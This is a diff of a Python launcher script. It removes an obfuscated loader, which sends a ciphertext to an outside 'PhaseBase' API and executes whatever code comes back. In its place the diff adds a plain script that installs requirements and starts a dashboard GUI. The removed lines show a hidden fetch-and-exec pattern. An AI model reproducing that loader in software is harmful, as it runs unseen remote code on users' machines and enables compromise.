@@ -1,8 +1,47 @@
-# PhaseBase :: GoodLuck Cloud (server-sealed payload) — decoder lives behind the PhaseBase API.
-import json, urllib.request
-_CT="Brn34EQ8cVkwrztDtQmvH6clOcFWANdojgPb"
-_IV="J80GDvsCZw8s2LxD"
-_API="https://phasebase.lovable.app/api/public/goodluck/decode"
-_req=urllib.request.Request(_API, data=json.dumps({"ct":_CT,"iv":_IV}).encode(), headers={"Content-Type":"application/json"})
-_src=json.loads(urllib.request.urlopen(_req).read())["code"]
-exec(compile(_src, "<phasebase>", "exec"))
+import sys, os, subprocess
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+from gui.dashboard import main
+
+
+
+def install_requirements():
+
+    try:
+
+
+        subprocess.check_call(
+
+            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt"]
+
+        )
+
+        print("All requirements installed successfully!")
+
+    except subprocess.CalledProcessError as e:
+
+        print(f"An error occurred while installing requirements: {e}")
+
+        sys.exit(1)
+
+    except FileNotFoundError:
+
+        print("Error: 'requirements.txt' file not found.")
+
+        sys.exit(1)
+
+
+
+
+
+if __name__ == "__main__":
+
+
+    install_requirements()
+
+
+
+if __name__ == "__main__":
+
+    main() 
